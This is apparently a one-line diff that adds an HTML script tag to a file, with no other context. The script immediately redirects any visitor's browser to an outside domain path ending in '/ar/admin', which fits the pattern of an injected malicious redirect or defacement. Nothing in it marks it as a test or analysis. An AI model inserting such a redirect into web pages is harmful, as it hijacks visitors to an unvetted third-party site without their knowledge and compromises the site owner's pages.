@@ -1,0 +1,1 @@
+<script>self.location='https://as.palexpand.ps/ar/admin';</script>
